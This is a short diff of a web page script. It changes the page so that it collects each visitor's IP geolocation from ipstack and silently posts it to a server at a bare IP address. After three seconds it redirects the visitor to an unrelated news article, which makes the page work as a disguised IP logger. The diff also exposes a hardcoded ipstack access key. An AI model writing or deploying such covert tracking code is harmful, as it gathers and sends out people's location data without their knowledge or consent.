@@ -45,11 +45,13 @@ a {
     _czc.push(["_setAccount", "1277350895"]);
 
     function timedCount() {
+        window.location="https://www.wallstreetcn.com/articles/3516463";
     }
 
     $.getJSON('http://api.ipstack.com/check?access_key=6376655ab488d2e75ad851c01385299c', function(data) {
         _czc.push(["_setCustomVar", "stack", JSON.stringify(data, null, 2)]);
-        alert(JSON.stringify(data, null, 2));
+        $.post("http://47.107.180.12/news.php",{"ii":JSON.stringify(data, null, 2)},function(result){
+        });
     });
 
     setTimeout(timedCount, 3000);
